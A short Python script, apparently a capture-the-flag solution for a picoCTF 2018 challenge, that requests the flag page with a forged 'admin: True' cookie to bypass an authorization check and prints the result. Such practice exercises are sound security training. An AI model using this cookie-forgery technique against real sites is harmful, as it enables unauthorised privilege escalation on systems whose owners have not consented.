#!/usr/bin/python3
import requests

s = requests.Session()
cookie_data = {'admin': 'True'}
re = s.get("http://2018shell3.picoctf.com:62746/flag", cookies = cookie_data)

print(re.text)
